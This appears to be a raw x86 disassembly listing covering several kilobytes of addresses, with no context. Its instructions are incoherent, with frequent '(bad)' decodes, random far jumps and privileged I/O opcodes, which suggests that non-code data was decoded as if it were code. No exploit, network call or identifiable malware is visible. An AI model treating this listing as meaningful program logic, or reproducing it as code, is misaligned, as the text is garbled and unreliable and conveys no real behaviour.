  42f053:	inc    edi
  42f054:	mov    edx,0x9e113577
  42f059:	or     al,0x87
  42f05b:	dec    esp
  42f05c:	cmp    cl,BYTE PTR [eax*8-0x7f0c4e28]
  42f063:	fs inc edi
  42f065:	mov    dh,0x9d
  42f067:	xchg   ebp,eax
  42f068:	xor    BYTE PTR [ebp+0x74],0x5b
  42f06c:	fwait
  42f06d:	mov    WORD PTR [eax],es
	...
  42f0d3:	add    BYTE PTR [eax],al
  42f0d5:	add    BYTE PTR [edx],dl
  42f0d7:	ds int 0xe5
  42f0da:	in     eax,dx
  42f0db:	idiv   DWORD PTR [edx]
  42f0dd:	(bad)  
  42f0de:	js     0x42f0e3
  42f0e0:	mov    DWORD PTR [ecx],ecx
  42f0e2:	cdq    
  42f0e3:	popa   
  42f0e4:	cmc    
  42f0e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f0e6:	addr16 clc 
  42f0e8:	add    DWORD PTR [eax],eax
  42f0ea:	add    BYTE PTR [ecx],al
  42f0ec:	add    BYTE PTR [eax],al
  42f0ee:	repz loopne 0x42f07a
  42f0f1:	sub    al,0xba
  42f0f3:	pop    edx
  42f0f4:	or     DWORD PTR gs:[esi+ebp*2-0x2b],eax
  42f0f9:	xor    al,0x86
  42f0fb:	adc    ecx,DWORD PTR [edi]
  42f0fd:	shl    BYTE PTR [esi-0x71],0xed
  42f101:	pusha  
  42f102:	ss xor eax,0x4c4a180e
  42f108:	bnd ja 0x42f173
  42f10b:	ss or  al,0x5b
  42f10e:	mul    DWORD PTR ds:0xf0575c40
  42f114:	out    0xac,eax
  42f116:	arpl   WORD PTR [eax],cx
  42f118:	or     eax,0xccecd07
  42f11d:	fcomp  st(3)
  42f11f:	sti    
  42f120:	xchg   edi,eax
  42f121:	pop    ds
  42f122:	sub    ch,bl
  42f124:	inc    esi
  42f125:	and    ecx,DWORD PTR [ecx-0x15]
  42f128:	push   ds
  42f129:	jns    0x42f13c
  42f12b:	int    0xd0
  42f12d:	fmulp  st(0),st
  42f12f:	inc    edi
  42f130:	inc    edx
  42f131:	pop    ebx
  42f132:	dec    ebx
  42f133:	aaa    
  42f134:	rep outs dx,BYTE PTR ds:[esi]
  42f136:	(bad)
  42f139:	inc    ecx
  42f13a:	loop   0x42f0c0
  42f13c:	mov    eax,ds:0x5b57f6dd
  42f141:	xchg   ecx,eax
  42f142:	jle    0x42f157
  42f144:	ds aas 
  42f146:	bound  eax,QWORD PTR [edx-0x4b964e26]
  42f14c:	les    esi,FWORD PTR [eax]
  42f14e:	adc    esi,DWORD PTR [eax-0x27d5d84]
  42f154:	and    ah,BYTE PTR [esi]
  42f156:	jo     0x42f125
  42f158:	push   esp
  42f159:	gs jmp 0xd321:0x9fdb4b8e
  42f161:	cmovl  ebx,DWORD PTR [eax-0xc]
  42f165:	and    dl,BYTE PTR [edi]
  42f167:	xor    BYTE PTR [eax+ecx*4+0x4967a0f3],cl
  42f16e:	sbb    bl,bh
  42f170:	push   ds
  42f171:	lahf   
  42f172:	push   ebp
  42f173:	pop    ecx
  42f174:	enter  0x7a64,0x38
  42f178:	xor    al,0xb1
  42f17a:	or     eax,0x73ca158b
  42f17f:	xchg   BYTE PTR [ebp-0x77cffb0b],ch
  42f185:	jmp    0x42f18f
  42f187:	call   0x5f7a:0xc5153dcf
  42f18e:	out    0x5,al
  42f190:	jge    0x42f14a
  42f192:	jmp    0x42f1ec
  42f194:	out    dx,eax
  42f195:	mul    BYTE PTR [edi-0x5fd40305]
  42f19b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f19c:	push   eax
  42f19d:	lock jmp 0xd323:0x8199459d
  42f1a5:	push   ss
  42f1a6:	daa    
  42f1a7:	rcl    BYTE PTR [edx-0x1a],cl
  42f1aa:	cmp    BYTE PTR [eax-0x4b],dl
  42f1ad:	mov    al,ds:0x8fa74727
  42f1b2:	pop    eax
  42f1b3:	fwait
  42f1b4:	xchg   esi,eax
  42f1b5:	ins    BYTE PTR es:[edi],dx
  42f1b6:	jmp    0x42f166
  42f1b8:	arpl   WORD PTR [edx],dx
  42f1ba:	sbb    BYTE PTR [edi+0x4c9791e1],dl
  42f1c0:	neg    bh
  42f1c2:	mov    esp,0xa5e3fddc
  42f1c7:	test   al,0x16
  42f1c9:	ins    DWORD PTR es:[edi],dx
  42f1ca:	pop    ebx
  42f1cb:	cwde   
  42f1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f1cd:	loope  0x42f164
  42f1cf:	jmp    0x108d:0xcc424370
  42f1d6:	sbb    bh,al
  42f1d8:	(bad)
  42f1db:	sub    ecx,edx
  42f1dd:	ins    BYTE PTR es:[edi],dx
  42f1de:	retf   
  42f1df:	(bad)  
  42f1e0:	fs xchg esp,eax
  42f1e2:	mov    ds:0xb869bd45,eax
  42f1e7:	add    al,0x84
  42f1e9:	ds out 0x5f,al
  42f1ec:	push   cs
  42f1ed:	cmp    eax,0x0
	...
  42f256:	pop    edx
  42f257:	es jecxz 0x42f29d
  42f25a:	inc    edi
  42f25c:	cli    
  42f25d:	aas    
  42f25e:	into   
  42f25f:	retf   0x3f8e
  42f262:	in     eax,dx
  42f263:	push   ebp
  42f264:	stc    
  42f265:	shl    DWORD PTR [edi-0x7],cl
  42f268:	add    DWORD PTR [eax],eax
  42f26a:	add    BYTE PTR [ecx],al
  42f26c:	add    BYTE PTR [eax],al
  42f26e:	jmp    FWORD PTR [edi-0x1193eea1]
  42f274:	dec    ebx
  42f275:	into   
  42f276:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f277:	dec    edx
  42f278:	loopne 0x42f2c5
  42f27a:	mov    al,ds:0xb880262f
  42f27f:	test   eax,0xa1a7607d
  42f284:	add    DWORD PTR [eax-0x2a5a6888],ecx
  42f28a:	jo     0x42f237
  42f28c:	xor    ah,BYTE PTR [ebx-0x2a5f4bbb]
  42f292:	aad    0xd1
  42f294:	les    eax,FWORD PTR [esi]
  42f296:	sbb    BYTE PTR ds:0x158efa72,dl
  42f29c:	push   cs
  42f29d:	shl    al,0x6b
  42f2a0:	test   BYTE PTR [esi+0x5c],dh
  42f2a3:	ret    
  42f2a4:	mov    WORD PTR [esi],ss
  42f2a6:	stc    
  42f2a7:	xor    BYTE PTR [edx-0x215fd37d],ah
  42f2ad:	test   al,0x55
  42f2af:	cmp    eax,0xe1dcbd8
  42f2b4:	or     al,0xd5
  42f2b6:	inc    ebx
  42f2b7:	xor    ebp,ecx
  42f2b9:	xchg   edi,eax
  42f2ba:	stos   DWORD PTR es:[edi],eax
  42f2bb:	push   0xd199cbb6
  42f2c0:	push   ss
  42f2c1:	dec    esi
  42f2c2:	or     DWORD PTR [ebx+0x1319c1a],ebp
  42f2c8:	inc    eax
  42f2c9:	jp     0x42f2bc
  42f2cb:	sahf   
  42f2cc:	xor    BYTE PTR [ebp+0x53],dl
  42f2cf:	nop
  42f2d0:	add    ch,BYTE PTR [eax-0x43]
  42f2d3:	push   esp
  42f2d4:	popa   
  42f2d5:	repnz icebp 
  42f2d7:	in     eax,0xf9
  42f2d9:	xchg   edi,eax
  42f2da:	pop    eax
  42f2db:	lahf   
  42f2dc:	pop    ebx
  42f2dd:	aad    0xf
  42f2df:	mov    ds:0xa7689d0d,eax
  42f2e4:	adc    al,0xc6
  42f2e6:	add    eax,0x9367823
  42f2eb:	stos   DWORD PTR es:[edi],eax
  42f2ec:	push   eax
  42f2ed:	(bad)  
  42f2ee:	pop    esp
  42f2ef:	cmp    DWORD PTR [edi+0x15],edx
  42f2f2:	fadd   DWORD PTR [edx+0x33]
  42f2f5:	out    dx,al
  42f2f6:	adc    al,0x7c
  42f2f8:	cmp    eax,0xca9781a4
  42f2fd:	xor    BYTE PTR [ebx],al
  42f2ff:	push   cs
  42f300:	and    BYTE PTR [edi-0x4e6ca7f6],bl
  42f306:	adc    ecx,DWORD PTR [ebx]
  42f308:	dec    ebx
  42f309:	fs leave 
  42f30b:	and    eax,0xc8562d85
  42f310:	inc    ecx
  42f311:	jge    0x42f301
  42f313:	repnz nop
  42f315:	retf   0xec94
  42f318:	jns    0x42f35f
  42f31a:	mov    esp,0x314df22f
  42f31f:	sub    cl,bh
  42f321:	aaa    
  42f322:	ret    
  42f323:	mov    ebx,DWORD PTR [eax+0x2594998b]
  42f329:	push   es
  42f32a:	mov    bl,0xb8
  42f32c:	shl    bh,0x24
  42f32f:	je     0x42f36e
  42f331:	scas   al,BYTE PTR es:[edi]
  42f332:	and    ebp,0x31719e59
  42f338:	in     al,dx
  42f339:	and    eax,0x4d42c639
  42f33e:	jmp    0x5c3f:0xbb7e9b45
  42f345:	add    al,0xf9
  42f347:	mov    cl,0xa1
  42f349:	inc    eax
  42f34a:	inc    edi
  42f34b:	jmp    0x42f3c1
  42f34d:	xchg   ebp,eax
  42f34e:	pop    esp
  42f34f:	repnz imul esp,DWORD PTR [ecx-0x11],0xffffff96
  42f354:	outs   dx,BYTE PTR cs:[esi]
  42f356:	daa    
  42f357:	mov    ah,0xbd
  42f359:	rcl    BYTE PTR [ebx+0x6216d060],cl
  42f35f:	jle    0x42f315
  42f361:	pop    ebp
  42f362:	or     esi,edi
  42f364:	and    esi,edi
  42f366:	jle    0x42f34e
  42f368:	stc    
  42f369:	xchg   edx,eax
  42f36a:	cmp    eax,0xd5ae61
	...
  42f3d3:	add    BYTE PTR [eax],al
  42f3d5:	add    BYTE PTR [ebp-0x5075f7e6],bh
  42f3db:	call   0xcc3a:0x5ac03fbf
  42f3e2:	and    al,0xef
  42f3e4:	inc    esp
  42f3e5:	and    eax,0x1fa67
  42f3ea:	add    BYTE PTR [ecx],al
  42f3ec:	add    BYTE PTR [eax],al
  42f3ee:	inc    ebx
  42f3ef:	xchg   esi,eax
  42f3f0:	xchg   ecx,eax
  42f3f1:	xchg   esi,eax
  42f3f2:	pop    ebx
  42f3f3:	inc    edi
  42f3f4:	dec    ecx
  42f3f5:	push   esi
  42f3f6:	(bad)  
  42f3f7:	jne    0x42f3d9
  42f3f9:	ret    
  42f3fa:	pop    edx
  42f3fb:	xor    ah,BYTE PTR [esi+0x8]
  42f3fe:	pop    eax
  42f3ff:	xchg   DWORD PTR [ecx],ebp
  42f401:	mov    DWORD PTR [esi+0x65],ecx
  42f404:	arpl   bx,sp
  42f406:	aaa    
  42f407:	or     ecx,0xffffff9a
  42f40a:	xchg   esi,eax
  42f40b:	or     DWORD PTR [ebp+0x44],ecx
  42f40e:	sub    BYTE PTR [eax+0x9],dh
  42f411:	push   ebp
  42f412:	scas   eax,DWORD PTR es:[edi]
  42f413:	cmp    BYTE PTR [ecx],bh
  42f415:	dec    edi
  42f416:	fistp  DWORD PTR [edx+0x70323495]
  42f41c:	arpl   WORD PTR [esp+edx*2+0x7d586507],ax
  42f423:	mov    BYTE PTR [edx+0x10],bl
  42f426:	imul   edi,eax,0x8b453d80
  42f42c:	add    DWORD PTR [edx+ebx*8],edx
  42f42f:	jmp    0x3a314bec
  42f434:	(bad)  
  42f435:	das    
  42f436:	leave  
  42f437:	out    0x5c,eax
  42f439:	fcomp  st(5)
  42f43b:	push   edx
  42f43c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42f43d:	fimul  WORD PTR [ebp+0x75ded204]
  42f443:	retf   
  42f444:	imul   ebx,DWORD PTR [esi],0x9fcb94c5
  42f44a:	dec    ebp
  42f44b:	jle    0x42f488
  42f44d:	push   ecx
  42f44e:	and    BYTE PTR ds:0xf45b98be,dh
  42f454:	sbb    eax,0x801be995
  42f459:	mov    eax,ds:0xf6315ab9
  42f45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f45f:	adc    al,0x75
  42f461:	cmp    edx,DWORD PTR [edi]
  42f463:	hlt    
  42f464:	pop    ss
  42f465:	mov    esi,0x69967513
  42f46a:	daa    
  42f46b:	xchg   esi,eax
  42f46c:	mov    al,0x83
  42f46e:	push   0xc94d931d
  42f473:	xor    al,0xc3
  42f475:	adc    ah,al
  42f477:	sbb    BYTE PTR [esi+0xafbdeeb],dh
  42f47d:	and    edx,edx
  42f47f:	sbb    al,0x21
  42f481:	loope  0x42f497
  42f483:	es mov ebx,0xc63699a9
  42f489:	inc    edi
  42f48a:	add    al,0x3b
  42f48c:	pop    edi
  42f48d:	pop    edi
  42f48e:	(bad)
  42f492:	retf   
  42f493:	dec    ebp
  42f494:	xchg   esi,eax
  42f495:	hlt    
  42f496:	rol    DWORD PTR [ecx-0x294821fb],cl
  42f49c:	(bad)  
  42f49d:	push   0xa
  42f49f:	push   ss
  42f4a0:	sbb    esp,esp
  42f4a2:	pop    edi
  42f4a3:	and    edx,0x2b84db86
  42f4a9:	mov    al,0xf5
  42f4ab:	inc    ebp
  42f4ac:	add    edi,DWORD PTR [ebp+0x26]
  42f4af:	aas    
  42f4b0:	cmp    ecx,DWORD PTR [ecx]
  42f4b2:	inc    edi
  42f4b3:	add    eax,0x543e8d5a
  42f4b8:	mov    bl,0x31
  42f4ba:	daa    
  42f4bb:	dec    esp
  42f4bc:	mov    ah,BYTE PTR [edi-0x1d]
  42f4bf:	jbe    0x42f526
  42f4c1:	cmp    bl,BYTE PTR [ebx+eiz*1-0x3896b484]
  42f4c8:	xchg   esi,eax
  42f4c9:	jmp    0xccc3:0xf10c09e
  42f4d0:	dec    ecx
  42f4d1:	xchg   esp,eax
  42f4d2:	in     al,0x56
  42f4d4:	mov    ah,0xd0
  42f4d6:	cwde   
  42f4d7:	xchg   ebp,eax
  42f4d8:	cld    
  42f4d9:	clc    
  42f4da:	jo     0x42f508
  42f4dc:	(bad)  
  42f4dd:	push   esi
  42f4de:	addr16 jno 0x42f47b
  42f4e1:	cwde   
  42f4e2:	loopne 0x42f4ec
  42f4e4:	je     0x42f4bf
  42f4e6:	inc    esi
  42f4e7:	ror    BYTE PTR [ebx-0x42],0x74
  42f4eb:	(bad)  
  42f4ed:	add    BYTE PTR [eax],0x0
	...
  42f554:	add    BYTE PTR [eax],al
  42f556:	aaa    
  42f557:	jae    0x42f5a3
  42f559:	cdq    
  42f55a:	dec    esi
  42f55b:	mov    ecx,0x13f4fff7
  42f560:	jno    0x42f591
  42f562:	cmp    BYTE PTR [ecx-0x4982b56],dh
  42f568:	add    DWORD PTR [eax],eax
  42f56a:	add    BYTE PTR [ecx],al
  42f56c:	add    BYTE PTR [eax],al
  42f56e:	push   cs
  42f56f:	inc    ebx
  42f570:	dec    ecx
  42f571:	punpckhdq mm2,QWORD PTR [esp+ecx*2]
  42f575:	mov    eax,ds:0xbf346ad7
  42f57a:	inc    ebx
  42f57b:	scas   eax,DWORD PTR es:[edi]
  42f57c:	pusha  
  42f57d:	dec    ebx
  42f57e:	mov    al,0x64
  42f580:	push   cs
  42f581:	xor    ecx,ecx
  42f583:	adc    eax,0xd006f70
  42f588:	push   edx
  42f589:	dec    esp
  42f58a:	push   ds
  42f58b:	mov    cl,0x2d
  42f58d:	repz mov bh,ch
  42f590:	fiadd  WORD PTR [edx]
  42f592:	stos   DWORD PTR es:[edi],eax
  42f593:	pop    eax
  42f594:	fnstcw WORD PTR [ebx+0x4f61f789]
  42f59a:	push   0xb6e08160
  42f59f:	pushf  
  42f5a0:	inc    esi
  42f5a1:	adc    DWORD PTR [eax-0x26],eax
  42f5a4:	sub    eax,DWORD PTR [ecx+0x7c793a20]
  42f5aa:	adc    BYTE PTR ds:0x3e6650cd,cl
  42f5b0:	jle    0x42f604
  42f5b2:	test   DWORD PTR [edi+edx*2-0x27],edi
  42f5b6:	fwait
  42f5b7:	push   ds
  42f5b8:	jae    0x42f621
  42f5ba:	inc    ecx
  42f5bb:	sbb    ch,BYTE PTR [edi-0x2]
  42f5be:	cmp    ch,BYTE PTR [ebx+0x36]
  42f5c1:	das    
  42f5c2:	cmpps  xmm1,XMMWORD PTR [edi],0x1f
  42f5c6:	jb     0x42f5ec
  42f5c8:	fstp   TBYTE PTR [ebx]
  42f5ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f5cb:	loopne 0x42f580
  42f5cd:	dec    edi
  42f5ce:	shr    BYTE PTR [bp+di-0x5d],0x35
  42f5d3:	pushf  
  42f5d4:	mov    al,0x57
  42f5d6:	xor    al,0x6f
  42f5d8:	push   eax
  42f5d9:	aad    0x57
  42f5db:	push   eax
  42f5dc:	sub    BYTE PTR [ebp+0x4e457d50],0x4d
  42f5e3:	ins    DWORD PTR es:[edi],dx
  42f5e4:	add    BYTE PTR [edi],dl
  42f5e6:	or     BYTE PTR [edx+0x5c],0x2f
  42f5ea:	and    DWORD PTR [esi-0x69ec890a],ebp
  42f5f0:	imul   ebp,DWORD PTR [ebx-0x3d05dcb7],0xffffffa9
  42f5f7:	stc    
  42f5f8:	lea    esi,[ebx]
  42f5fa:	rcl    ah,cl
  42f5fc:	data16 xchg BYTE PTR [ecx],dl
  42f5ff:	dec    ebx
  42f600:	xor    al,0xf8
  42f602:	lods   al,BYTE PTR ds:[esi]
  42f603:	(bad)  
  42f604:	mov    ds:0xa68d3400,eax
  42f609:	mov    ds:0x9e5ff782,eax
  42f60e:	inc    eax
  42f60f:	lahf   
  42f610:	sub    al,0x95
  42f612:	sbb    ecx,edx
  42f614:	push   es
  42f615:	dec    eax
  42f616:	cmp    DWORD PTR [ecx-0x58],0x71
  42f61a:	test   al,ch
  42f61c:	mov    ecx,DWORD PTR [eax-0x9]
  42f61f:	(bad)  
  42f620:	and    DWORD PTR [ecx],esp
  42f622:	jp     0x42f5c7
  42f624:	pop    ss
  42f625:	cmp    BYTE PTR [edx],bl
  42f627:	jo     0x42f61f
  42f629:	pop    ecx
  42f62a:	inc    esi
  42f62b:	das    
  42f62c:	shl    BYTE PTR [ecx-0x6022c771],cl
  42f632:	fadd   DWORD PTR ss:[eax-0x6cd25119]
  42f639:	aas    
  42f63a:	sbb    BYTE PTR [ebx+0x2886dd9f],cl
  42f640:	ror    DWORD PTR [edx-0x2aae6677],1
  42f646:	popa   
  42f647:	sub    ch,BYTE PTR [esi]
  42f649:	inc    esp
  42f64a:	mov    ds:0xacee0833,al
  42f64f:	pop    es
  42f650:	cmp    eax,0xb922cf0c
  42f655:	(bad)  
  42f657:	addr16 aam 0x47
  42f65a:	cmp    ebp,DWORD PTR [ecx-0x1546404]
  42f660:	stos   DWORD PTR es:[edi],eax
  42f661:	mov    al,ds:0x75205229
  42f666:	mov    esi,0xa575989
  42f66b:	imul   ecx,eax,0x33
	...
  42f6d5:	add    BYTE PTR [esi],bh
  42f6d7:	push   esi
  42f6d8:	into   
  42f6d9:	nop
  42f6da:	out    dx,al
  42f6db:	cwde   
  42f6dc:	jle    0x42f6dc
  42f6de:	push   eax
  42f6df:	sub    edx,esi
  42f6e1:	dec    esp
  42f6e2:	mov    edx,0x67a3eead
  42f6e7:	cld    
  42f6e8:	add    DWORD PTR [eax],eax
  42f6ea:	add    BYTE PTR [ecx],al
  42f6ec:	add    BYTE PTR [eax],al
  42f6ee:	lea    ecx,[eax+0x404e8570]
  42f6f4:	outs   dx,BYTE PTR ds:[esi]
  42f6f5:	in     al,dx
  42f6f6:	sbb    al,0xe3
  42f6f8:	out    0xfb,eax
  42f6fa:	test   BYTE PTR [edx+0x1d],0x5a
  42f6fe:	sub    dl,BYTE PTR [ecx+ebx*1+0x13]
  42f702:	(bad)  
  42f703:	repnz pop esp
  42f705:	sbb    DWORD PTR [edi-0x3f7aefae],esp
  42f70b:	in     al,dx
  42f70c:	mov    ds:0xefa48d63,eax
  42f711:	lods   al,BYTE PTR ds:[esi]
  42f712:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f713:	out    0x1,al
  42f715:	loop   0x42f78d
  42f717:	retf   
  42f718:	outs   dx,BYTE PTR ds:[esi]
  42f719:	mov    eax,0xfa2ef097
  42f71e:	push   eax
  42f71f:	sub    al,0x3
  42f721:	push   0x58b3740e
  42f726:	and    BYTE PTR [ebp-0xa],0x8b
  42f72a:	das    
  42f72b:	add    BYTE PTR [edx],ch
  42f72d:	mov    al,ds:0x5dba39b5
  42f732:	sbb    eax,0x5ec6874e
  42f737:	inc    edi
  42f738:	mov    bh,0x65
  42f73a:	cmp    al,0x89
  42f73c:	pop    eax
  42f73d:	xor    ecx,esp
  42f73f:	dec    esi
  42f740:	mov    edx,0xb2667eea
  42f745:	jne    0x42f77e
  42f747:	sbb    al,0x7
  42f749:	ret    0x293a
  42f74c:	and    al,0x93
  42f74e:	cmp    al,ch
  42f750:	hlt    
  42f751:	enter  0x2dfc,0xe9
  42f755:	test   eax,0xa746a3ad
  42f75a:	loope  0x42f7c8
  42f75c:	std    
  42f75d:	pushf  
  42f75e:	xlat   BYTE PTR gs:[ebx]
  42f760:	add    ecx,ebx
  42f762:	jl     0x42f755
  42f764:	fdivrp st(4),st
  42f766:	cwde   
  42f767:	sub    cl,dl
  42f769:	(bad)  
  42f76a:	jmp    0x3369630e
  42f76f:	add    edx,DWORD PTR [esi]
  42f771:	fcmove st,st(0)
  42f773:	cmp    eax,0x5715b36e
  42f778:	stc    
  42f779:	cs out dx,eax
  42f77b:	jbe    0x42f7c5
  42f77d:	sub    ebp,DWORD PTR [edx]
  42f77f:	mov    ebp,DWORD PTR [esi+ebp*2-0x50]
  42f783:	popf   
  42f784:	sbb    DWORD PTR [edi+0x5108ba0e],edx
  42f78a:	pop    ds
  42f78b:	mov    ds:0x595ae886,al
  42f790:	dec    edx
  42f791:	fidiv  WORD PTR [edi-0x37]
  42f794:	and    eax,0x5bedd5d0
  42f799:	test   DWORD PTR [edi],0xe1c82cb2
  42f79f:	lahf   
  42f7a0:	dec    ebx
  42f7a1:	xor    DWORD PTR [esi+0x41fc2ad0],eax
  42f7a7:	leave  
  42f7a8:	xor    BYTE PTR [edx],bh
  42f7aa:	add    BYTE PTR [ecx-0x16],ah
  42f7ad:	sub    eax,0x586a8acb
  42f7b2:	mov    ds:0x39d95926,eax
  42f7b7:	sti    
  42f7b8:	stos   DWORD PTR es:[edi],eax
  42f7b9:	jg     0x42f7f9
  42f7bb:	xor    ecx,ebx
  42f7bd:	in     al,dx
  42f7be:	cmc    
  42f7bf:	sbb    al,0x71
  42f7c1:	call   0xfc4e:0xf8c782f0
  42f7c8:	fimul  DWORD PTR [ebp-0x44]
  42f7cb:	js     0x42f78c
  42f7cd:	jge    0x42f7f1
  42f7cf:	rol    DWORD PTR [ebp+0x55cc4fb5],0x6d
  42f7d6:	sbb    DWORD PTR [esp+edx*8-0x35],esi
  42f7da:	mov    dl,0x1d
  42f7dc:	dec    edi
  42f7dd:	inc    ebp
  42f7de:	ret    
  42f7df:	xchg   edi,eax
  42f7e0:	adc    bh,BYTE PTR [edi+0x2a]
  42f7e3:	adc    ecx,edx
  42f7e5:	scas   al,BYTE PTR es:[edi]
  42f7e6:	dec    dh
  42f7e8:	pusha  
  42f7e9:	mov    cl,0xcd
  42f7eb:	lea    esp,[edi+0x78]
	...
  42f855:	add    BYTE PTR [ecx-0x5f],dh
  42f858:	(bad)  
  42f859:	test   al,0xd6
  42f85b:	(bad)  
  42f85c:	jg     0x42f857
  42f85e:	push   cs
  42f85f:	pop    ebp
  42f860:	push   ebp
  42f861:	mov    edi,0x25176ca
  42f866:	addr16 std 
  42f868:	add    DWORD PTR [eax],eax
  42f86a:	add    BYTE PTR [ecx],al
  42f86c:	add    BYTE PTR [eax],al
  42f86e:	jecxz  0x42f842
  42f870:	xchg   ecx,eax
  42f871:	dec    ebx
  42f872:	push   eax
  42f873:	jmp    0xb6b4:0xdf2e0ea7
  42f87a:	rcl    edx,cl
  42f87c:	popa   
  42f87d:	repnz adc ah,al
  42f880:	icebp  
  42f881:	jae    0x42f83a
  42f883:	call   0x60d:0xc3db625a
  42f88a:	test   DWORD PTR [esi-0x76],edi
  42f88d:	jg     0x42f861
  42f88f:	jne    0x42f834
  42f891:	sub    DWORD PTR [esi+0xa48c80e],esp
  42f897:	cmc    
  42f898:	jmp    0x92ca:0x30aa5955
  42f89f:	fmul   DWORD PTR [edx-0x54]
  42f8a2:	and    bh,cl
  42f8a4:	xor    cl,0xd0
  42f8a7:	mov    edi,0x809ad7de
  42f8ac:	int    0x8b
  42f8ae:	imul   esp,DWORD PTR [eax+0x14],0xd4b0b87b
  42f8b5:	sub    al,0xed
  42f8b7:	pop    edx
  42f8b8:	(bad)  
  42f8b9:	bound  eax,QWORD PTR [ebp+0x48f76405]
  42f8bf:	imul   ecx,esp,0x15
  42f8c2:	adc    al,0x65
  42f8c4:	jle    0x42f88b
  42f8c6:	push   eax
  42f8c7:	lock mov cl,0xe8
  42f8ca:	sbb    eax,0x7e7ec83a
  42f8cf:	add    DWORD PTR [edi-0x7a4b2608],0xffffffa3
  42f8d6:	arpl   WORD PTR [esp+edi*1-0x534d8560],bp
  42f8dd:	push   esi
  42f8de:	jne    0x42f93f
  42f8e0:	cmp    al,0x21
  42f8e2:	test   al,0x35
  42f8e4:	imul   ebp,ecx,0x86e7cda3
  42f8ea:	mov    esi,0x64ed1da
  42f8ef:	sub    eax,0x8161f20a
  42f8f4:	div    BYTE PTR [ebx-0x5c]
  42f8f7:	mov    al,0xce
  42f8f9:	or     al,0x5a
  42f8fb:	or     BYTE PTR [ebx+0x74],ch
  42f8fe:	jecxz  0x42f88e
  42f900:	dec    edi
  42f901:	mov    edi,0xafb158ab
  42f906:	cmp    ah,dl
  42f908:	dec    ecx
  42f909:	dec    eax
  42f90a:	jmp    0x823b0d9a
  42f90f:	push   ebx
  42f910:	mov    DWORD PTR [esi],ebx
  42f912:	cmp    edx,esp
  42f914:	push   cs
  42f915:	jne    0x42f8fb
  42f917:	push   eax
  42f918:	stos   DWORD PTR es:[edi],eax
  42f919:	xor    eax,0x23b54a8f
  42f91e:	ins    BYTE PTR es:[edi],dx
  42f91f:	jne    0x42f954
  42f921:	jecxz  0x42f92a
  42f923:	in     eax,dx
  42f924:	scas   al,BYTE PTR es:[edi]
  42f925:	mov    ebp,0xffdea8ea
  42f92a:	fisttp QWORD PTR [ecx]
  42f92c:	out    0xa7,eax
  42f92e:	(bad)  
  42f92f:	fiadd  WORD PTR [eax]
  42f931:	jle    0x42f985
  42f933:	push   0x52
  42f935:	xchg   DWORD PTR [edx+0x2b95187f],ecx
  42f93b:	in     al,dx
  42f93c:	repnz lock push cs
  42f93f:	jl     0x42f929
  42f941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42f942:	aas    
  42f943:	jmp    0xc47b:0xf6d1247b
  42f94a:	adc    BYTE PTR [ebx],dh
  42f94c:	pop    ecx
  42f94d:	scas   eax,DWORD PTR es:[edi]
  42f94e:	cmp    dl,bh
  42f950:	icebp  
  42f951:	push   0x285c592f
  42f956:	and    BYTE PTR [ecx-0x6070c4c1],0xb1
  42f95d:	cli    
  42f95e:	vdivpd xmm7,xmm6,XMMWORD PTR [ebx]
  42f962:	adc    al,0x68
  42f964:	daa    
  42f965:	ror    DWORD PTR [eax+edi*1],cl
  42f968:	inc    ebx
  42f969:	push   cs
  42f96a:	lahf   
  42f96b:	js     0x42f98a
  42f96d:	adc    al,0x0
	...
  42f9d3:	add    BYTE PTR [eax],al
  42f9d5:	add    BYTE PTR [esp+esi*2],dl
  42f9d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f9d9:	push   ebp
  42f9da:	in     al,0xd5
  42f9dc:	cmc    
  42f9dd:	jne    0x42f98a
  42f9df:	sbb    cl,dh
  42f9e1:	js     0x42fa03
  42f9e3:	fucomip st,st(7)
  42f9e5:	and    al,0x67
  42f9e7:	inc    BYTE PTR [ecx]
  42f9e9:	add    BYTE PTR [eax],al
  42f9eb:	add    DWORD PTR [eax],eax
  42f9ed:	add    ch,al
  42f9ef:	cmc    
  42f9f0:	pushf  
  42f9f1:	xlat   BYTE PTR ds:[ebx]
  42f9f2:	fst    DWORD PTR [ecx+0x46]
  42f9f5:	sbb    DWORD PTR [edx],edx
  42f9f7:	ins    DWORD PTR es:[edi],dx
  42f9f8:	cmp    cl,BYTE PTR ds:0xcb7a3da5
  42f9fe:	(bad)  
  42f9ff:	loope  0x42fa03
  42fa01:	or     ebp,ebx
  42fa03:	cwde   
  42fa04:	pop    esi
  42fa05:	in     al,dx
  42fa06:	int    0x30
  42fa08:	daa    
  42fa09:	mov    ecx,ebx
  42fa0b:	not    DWORD PTR [edi+0x4d]
  42fa0e:	jnp    0x42fa3e
  42fa10:	dec    esi
  42fa11:	jno    0x42fa83
  42fa13:	fcom   st(7)
  42fa15:	xchg   edi,eax
  42fa16:	dec    ebx
  42fa17:	popa   
  42fa18:	dec    esp
  42fa19:	jae    0x42fa4e
  42fa1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fa1c:	scas   eax,DWORD PTR es:[edi]
  42fa1d:	shr    BYTE PTR [ebp+0x70],0xa4
  42fa21:	pop    esi
  42fa22:	and    ebp,DWORD PTR [esi+edx*1-0x5]
  42fa26:	repz mov edi,cs
  42fa29:	sub    DWORD PTR [ecx+0x1afabaca],edx
  42fa2f:	add    eax,0xf76da9fc
  42fa34:	add    DWORD PTR [edx],ebp
  42fa36:	pop    esi
  42fa37:	dec    esp
  42fa38:	repz fcomp DWORD PTR [ecx-0x5649f841]
  42fa3f:	aas    
  42fa40:	and    DWORD PTR [ecx+0x29],0x7d
  42fa44:	shr    bl,cl
  42fa46:	sbb    ebp,eax
  42fa48:	sub    al,0xfc
  42fa4a:	sbb    ebp,DWORD PTR [ebx+0x59]
  42fa4d:	popa   
  42fa4e:	leave  
  42fa4f:	out    dx,eax
  42fa50:	mov    eax,0xf545da57
  42fa55:	jmp    0x42faa0
  42fa57:	aad    0x36
  42fa59:	mov    ds:0x9d214a8b,al
  42fa5e:	dec    edx
